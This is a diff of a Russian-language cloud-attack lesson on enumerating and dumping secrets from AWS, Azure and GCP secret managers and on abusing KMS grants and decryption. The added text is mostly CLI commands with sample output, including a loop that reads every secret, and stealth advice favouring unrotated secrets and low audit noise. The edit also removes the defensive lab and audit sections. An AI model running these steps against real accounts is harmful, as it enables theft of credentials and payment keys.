@@ -15,212 +15,149 @@ estimated_minutes: 45
 summary: "Как находить и извлекать секреты из AWS Secrets Manager, Azure Key Vault и GCP Secret Manager, и как злоупотреблять KMS. Практические команды и типовые мисконфиги."
 ---
 
-Секрет-менеджеры — централизованные хранилища паролей, ключей и токенов. Они лучше, чем секреты в env, но при слабых правах становятся «одной кнопкой» для получения всех кредов сразу. Урок про извлечение секретов и злоупотребление KMS.
+## Вопрос, с которого всё начинается
 
-## AWS Secrets Manager
+Разработчикам надоело держать пароли в переменных окружения — они текут в логи и дампы. Поэтому появились **секрет-менеджеры**: централизованные хранилища паролей, ключей и токенов, где доступ выдаётся правами, а каждое чтение пишется в аудит. Звучит надёжно.
 
-Каждый секрет — отдельная сущность с ARN, политикой ресурса и версиями.
+Но если права выданы слишком широко, хранилище превращается в «одну кнопку»: одно право — и на руках все креды компании сразу. Вопрос урока: как выкачать секреты из такого хранилища и как злоупотребить шифрованием.
 
-```bash
-# Список секретов
-aws secretsmanager list-secrets --query 'SecretList[].Name'
+## Наш пример: роль с широким доступом
 
-# Чтение значения
-aws secretsmanager get-secret-value --secret-id <name> \
-  --query 'SecretString' --output text
+У нас есть облачная **роль** (временная учётная запись для сервиса) `app-role`, и мы обнаружили, что ей разрешено `secretsmanager:GetSecretValue` на всё: `"Resource": "*"`. Проверим, что она видит. Для AWS хранилище называется **Secrets Manager**:
 
-# Метаданные и политика ресурса
-aws secretsmanager describe-secret --secret-id <name>
+```
+$ aws secretsmanager list-secrets --query 'SecretList[].Name'
+["prod/db", "prod/api-keys", "stripe/live"]
 ```
 
-Типовые мисконфиги: политика ресурса с `Principal: "*"` без condition, доступ для всей организации, секреты в публичных аккаунтах.
+Три секрета. Это уже карта: мы знаем, что именно стоит красть.
 
-```bash
-# Проверить, кто может читать секрет
-aws secretsmanager get-resource-policy --secret-id <name>
+## Шаг 1: читаем значения
+
+Каждый секрет — отдельная сущность с ARN (идентификатором) и версиями. Читаем по одному:
+
+```
+$ aws secretsmanager get-secret-value --secret-id prod/db --query 'SecretString' --output text
+{"username":"admin","password":"S3cr3t-Pg-Pass","host":"db.prod.internal"}
 ```
 
-## Azure Key Vault
+Пароль к продакшен-базе в открытом виде. Дальше по списку:
 
-Key Vault хранит секреты, ключи и сертификаты. Доступ — через RBAC или Access Policies.
-
-```bash
-# Список хранилищ
-az keyvault list --query '[].name'
-
-# Список секретов и чтение
-az keyvault secret list --vault-name <kv> --query '[].id'
-az keyvault secret show --vault-name <kv> --name <name> --query value -o tsv
-
-# Ключи и сертификаты
-az keyvault key list --vault-name <kv>
-az keyvault certificate list --vault-name <kv>
+```
+$ aws secretsmanager get-secret-value --secret-id stripe/live --query 'SecretString' --output text
+sk_live_51H8...
 ```
 
-Частая ошибка — `Access Policies` с `get`/`list` для широкой группы или managed identity, доступной из пода.
+Ключ платёжного сервиса. Обрати внимание: каждое чтение — это `GetSecretValue`, и оно **всегда** фиксируется в CloudTrail. В отличие от чтения S3 (которое логируется только с data events), секреты «тихо» не украдёшь.
 
-## GCP Secret Manager
+## Шаг 2: почему это открылось
 
-```bash
-# Список секретов
-gcloud secrets list --format='value(name)'
-# Чтение последней версии
-gcloud secrets versions access latest --secret=<name>
-# Проверка IAM
-gcloud secrets get-iam-policy <name>
+За доступ отвечает **resource policy** — политика, привязанная к самому секрету. Частый мисконфиг — разрешение для всех:
+
+```
+$ aws secretsmanager get-resource-policy --secret-id prod/db
+{"Statement":[{"Effect":"Allow","Principal":"*","Action":"secretsmanager:GetSecretValue"}]}
 ```
 
-Секреты могут быть доступны через `roles/secretmanager.secretAccessor` сервисному аккаунту пода — тогда SSRF/код в поде = чтение секретов.
+`Principal: "*"` означает «любой субъект», и без условия это открывает секрет широкому кругу. Другой вариант — секрет доступен целой managed identity, которая есть у каждого пода кластера.
 
-## KMS: как злоупотреблять
+## Шаг 3: у других провайдеров — то же самое
 
-KMS управляет ключами шифрования. Атакующему важны два права: `kms:Decrypt` и `kms:CreateGrant`.
+Модель одинакова, меняются команды.
 
-```bash
-# Список ключей и их политики
-aws kms list-keys
-aws kms describe-key --key-id <id>
-aws kms get-key-policy --key-id <id> --policy-name default
+**Azure Key Vault** хранит секреты, ключи и сертификаты. Доступ — через RBAC или Access Policies:
 
-# Расшифровать перехваченный ciphertext
-aws kms decrypt --ciphertext-blob fileb://enc.bin \
-  --query Plaintext --output text | base64 -d
-
-# Опасное: выдать себе грант на чужой ключ
-aws kms create-grant --key-id <id> \
-  --grantee-principal <my-arn> --operations Decrypt
+```
+$ az keyvault list --query '[].name'
+$ az keyvault secret list --vault-name kv-prod --query '[].id'
+$ az keyvault secret show --vault-name kv-prod --name db-password --query value -o tsv
 ```
 
-Опасные конфигурации: ключ с политикой `Principal: "*"`, `kms:Decrypt` на `*`, или возможность `CreateGrant` — она превращается в Decrypt.
+**GCP Secret Manager**:
 
-## Разобранный пример: от пода в GCP к секретам
-
-**Дано:** под с service account, у которого `secretmanager.secretAccessor`.
-
-1. Из пода читаем креды SA (metadata или env) и проверяем:
-
-```bash
-gcloud auth list
-gcloud secrets list
+```
+$ gcloud secrets list --format='value(name)'
+$ gcloud secrets versions access latest --secret=db-password
 ```
 
-2. Читаем секреты:
+В GCP частая ошибка — выдать сервисному аккаунту пода роль `roles/secretmanager.secretAccessor`. Тогда любой SSRF или выполнение кода в поде = чтение секретов.
 
-```bash
-for s in $(gcloud secrets list --format='value(name)'); do
-  echo "=== $s ==="
-  gcloud secrets versions access latest --secret="$s"
-done
+## Шаг 4: KMS — не только хранилище, но и шифрование
+
+Секреты защищают **KMS** — сервис управления ключами шифрования. Атакующему важны два права:
+
+- **`kms:Decrypt`** — расшифровать перехваченный шифротекст;
+- **`kms:CreateGrant`** — выдать доступ к чужому ключу.
+
+```
+$ aws kms list-keys
+$ aws kms get-key-policy --key-id <id> --policy-name default
+$ aws kms decrypt --ciphertext-blob fileb://enc.bin --query Plaintext --output text | base64 -d
 ```
 
-3. Среди секретов — ключи к БД, API-токены, ключи других сервисов. Расширяем доступ.
+`CreateGrant` коварен: даже без `Decrypt` ты можешь сначала выдать себе право на расшифровку:
 
-## Секреты в IaC и логике
-
-Частые ошибки, которые ведут к утечке секрет-менеджера:
-
-- Секрет в открытом виде в Terraform state/plan (см. `cloud-terraform`).
-- Env-переменная с ARN секрета, но широкие права.
-- Политика ресурса, доверяющая `*`.
-- Managed identity пода с доступом ко всему Key Vault.
-
-```bash
-# Поиск ссылок на секреты в коде/пайплайнах
-grep -rE 'secretsmanager|keyvault|secretmanager|SecretString' . --hidden
+```
+$ aws kms create-grant --key-id <id> \
+  --grantee-principal arn:aws:iam::111122223333:user/me --operations Decrypt
 ```
 
-## Частые ошибки
+Политика ключа с `Principal: "*"` или `kms:Decrypt` на `*` — типовой мисконфиг. И помни разницу: права на объект и права на ключ — разные. Можно иметь `s3:GetObject`, но получить `AccessDenied` из-за запрета `kms:Decrypt`.
 
-- **Считать секрет-менеджер безопасным по определению.** Права решают всё.
-- **Забывать про resource policy.** Она может открывать секрет наружу.
-- **Игнорировать `kms:CreateGrant`.** Грант = Decrypt для получателя.
-- **Не проверять версии секрета.** Старая версия может содержать ещё валидный ключ.
-- **Путать права на секрет и права на ключ.** Чтение ciphertext без Decrypt бесполезно.
-- **Не смотреть логи.** `GetSecretValue` фиксируется в CloudTrail.
+## Шаг 5: откуда секреты текут помимо менеджера
 
-## Что дальше / решение
+- **Terraform/CloudFormation** — пароли баз данных в открытом виде в state и plan.
+- **Переменные окружения функций и подов** — утекают в логи, дампы памяти, `docker inspect`.
+- **Helm-чарты и CI-переменные** — `printenv` в раннере покажет «protected» переменную.
+- **Kubernetes Secrets** — объекты в etcd и CSI-драйверы.
 
-- Есть `GetSecretValue`/`get` → перебирайте все секреты, ищите «зонтичные» креды.
-- Есть `kms:Decrypt` → расшифровывайте перехваченные данные.
-- Есть `kms:CreateGrant` → выдайте себе Decrypt.
-- Смежные уроки: `cloud-credential-hunting`, `cloud-privesc-iam`, `cloud-terraform`.
+Ищи ссылки на хранилища по коду: `grep -rE 'secretsmanager|keyvault|secretmanager|SecretString' . --hidden`.
 
-## KMS: как злоупотреблять
+## Шаг 6: собираем всё разом
 
-KMS-ключ защищает секреты, но если у вас есть `kms:Decrypt` и доступ к зашифрованному blob — вы его расшифруете. Ключевые права: `kms:Decrypt`, `kms:GenerateDataKey`, `kms:CreateGrant`, `kms:PutKeyPolicy`. Последние два позволяют выдать себе доступ:
+Когда прав много, читать секреты по одному долго — автоматизируем. Список имён из `list-secrets` подаём на вход `get-secret-value`:
 
-```bash
-aws kms create-grant --key-id <id> --grantee-principal arn:aws:iam::111122223333:user/me \
-  --operations Decrypt
-aws kms get-key-policy --key-id <id> --policy-name default
+```
+$ aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | tr '\t' '\n' | \
+    while read s; do echo "== $s"; aws secretsmanager get-secret-value --secret-id "$s" \
+    --query SecretString --output text; done
+== prod/db
+{"username":"admin","password":"S3cr3t-Pg-Pass","host":"db.prod.internal"}
+== stripe/live
+sk_live_51H8...
 ```
 
-Key policy с `Principal: *` и `Condition` на аккаунт — частый мисконфиг.
+Полезно помнить про версии: у секрета их несколько, и `get-secret-value` по умолчанию отдаёт `AWSCURRENT`. Старая версия может содержать ещё живой ключ, который просто не успели отозвать:
 
-## Инструменты по провайдерам
-
-```bash
-# AWS
-aws secretsmanager list-secrets
-aws secretsmanager get-secret-value --secret-id db/prod
-aws ssm get-parameters-by-path --path /app --with-decryption
-# Azure
-az keyvault secret list --vault-name kv-prod
-az keyvault secret show --vault-name kv-prod --name db-password
-# GCP
-gcloud secrets list
-gcloud secrets versions access latest --secret=db-password
+```
+$ aws secretsmanager get-secret-value --secret-id prod/db \
+    --version-stage AWSPREVIOUS --query SecretString --output text
+{"username":"admin","password":"Old-Pg-Pass-2019"}
 ```
 
-Флаги важны: `--with-decryption` (SSM), `--name`/`--vault-name` (Azure), `versions access latest` (GCP).
+У GCP аналогично: `gcloud secrets versions list`, затем `access` нужной версии. Каждое такое чтение снова попадает в аудит — «собрать всё разом» быстрее, но и заметнее. Поэтому в реальной работе сначала уточняют, какие секреты действительно нужны для следующего шага, и читают только их.
 
-## Разобранный пример 2: от роли пода к секретам
+Ещё пригодится `describe-secret`: он показывает `LastRotatedDate` и `RotationEnabled`. Секрет, который не ротировали годами, — лучшая цель: его значение наверняка всё ещё действует где-то в продакшене, а отзыв такого ключа никто не заметит до следующего аудита.
 
-1. Роль пода имеет `secretsmanager:GetSecretValue` на `*`.
-2. `list-secrets` → находим `prod/db`, `prod/api-keys`.
-3. `get-secret-value` → получаем креды БД и API-ключи.
-4. Креды БД → подключение к RDS; API-ключи → внешние сервисы.
-5. Оцениваем blast radius и ротируем.
+## Что мы теперь знаем
 
-## Таблица примитивов
+1. Секрет-менеджер безопасен ровно настолько, насколько узки права.
+2. `list-secrets` даёт карту, `get-secret-value` — значения; `GetSecretValue` всегда в аудите.
+3. Resource policy с `Principal: *` открывает секрет наружу.
+4. `kms:Decrypt` расшифровывает данные, `kms:CreateGrant` позволяет выдать себе доступ.
+5. Секреты всё ещё текут из IaC, env и Kubernetes — не только из менеджера.
+6. `describe-secret` показывает ротацию: давно не ротировавшийся секрет — самая живучая и незаметная цель атаки.
 
-| Право | Эффект |
-|-------|--------|
-| GetSecretValue | чтение секрета |
-| ListSecrets | карта секретов |
-| kms:Decrypt | расшифровка blob |
-| kms:CreateGrant | выдать себе доступ |
-| ssm:GetParameter | параметры с секретами |
-| secretmanager.versions.access | секрет GCP |
+## На что смотреть дальше
 
-## Секреты в IaC и коде
-
-Секреты часто попадают в Terraform/CloudFormation (пароли RDS), в переменные окружения функций, в Helm-чарты, в CI-переменные. Ищите их через trufflehog/gitleaks по репозиториям и по state. В CI переменные могут быть «protected», но `printenv` в раннере их покажет. В Kubernetes — Secret-объекты и CSI-драйверы.
-
-## Практическое задание
-
-Создайте в LocalStack (или тестовом аккаунте) секрет с помощью `aws secretsmanager create-secret`, ограничьте доступ политикой, затем попробуйте прочитать его другой ролью — должен быть AccessDenied. Далее выдайте `kms:CreateGrant` и покажите, как можно расширить себе доступ к ключу. Это демонстрирует разницу между «секрет защищён» и «секрет реально недоступен».
-
-## Отличие «секрет-менеджер» от «секрет в переменной»
-
-Секрет-менеджер даёт аудит доступа, ротацию и централизованные права. Переменная окружения — нет: она утекает в логи, дампы памяти, `docker inspect`. При компрометации пода сначала читайте env (быстро), затем обращайтесь к менеджеру (аудит, но там свежие секреты). Разница для атакующего: менеджер требует отдельного права и оставляет след; env бесплатен, но может быть устаревшим.
-
-## Аудит доступа к секретам
-
-Включите CloudTrail data events для Secrets Manager/KMS и отслеживайте `GetSecretValue`/`Decrypt` из нетипичных principal. В Azure — diagnostic settings на Key Vault; в GCP — Data Access audit logs. Без этих логов вы не увидите кражу секретов. Атакующему важно знать, что `GetSecretValue` всегда логируется (в отличие от S3 GetObject без data events).
-
-## Быстрая проверка
-
-```bash
-aws secretsmanager list-secrets
-aws ssm get-parameters-by-path --path / --with-decryption
-az keyvault secret list --vault-name kv
-gcloud secrets list
-```
-
-Начните с перечисления секретов (если есть права), затем читайте по одному. Проверьте key policy KMS — широкий доступ к ключу равносилен доступу ко всем секретам.
+- **Права важнее «безопасности по названию».** Хранилище защищено ровно настолько, насколько узка политика.
+- **Проверяй версии секрета.** Старая версия может содержать ещё действующий ключ.
+- **Помни про аудит.** `GetSecretValue`/`Decrypt` логируются — не шуми лишними чтениями.
+- **Смотри key policy.** Широкий доступ к ключу равносилен доступу ко всем зашифрованным секретам.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какое право AWS KMS позволяет расшифровать ciphertext?"
@@ -255,15 +192,19 @@ gcloud secrets list
     - "roles/iam.securityReviewer"
   answer: 0
   explanation: "secretAccessor позволяет читать версии секретов."
-- question: "Почему resource policy секрета с Principal * опасна?"
+- question: "Почему чтение секрета в AWS не бывает «тихим»?"
   options:
-    - "Открывает чтение секрета широкому кругу субъектов"
-    - "Ускоряет шифрование"
-    - "Уменьшает стоимость"
-    - "Блокирует IAM"
+    - "GetSecretValue всегда логируется в CloudTrail"
+    - "Секреты шифруются на клиенте"
+    - "Требуется root"
+    - "Оно удаляет бакет"
   answer: 0
-  explanation: "Wildcard principal = потенциальный публичный доступ."
+  explanation: "В отличие от S3 GetObject, доступ к Secrets Manager фиксируется всегда."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-cloudtrail-evasion`) мы разберём, как защита видит эти чтения и какие техники снижения шума существуют. А пока главное: секрет-менеджер — это концентрат кредов, и слишком широкая политика делает его самым вкусным местом в аккаунте.
 
 ## Где пригодится
 
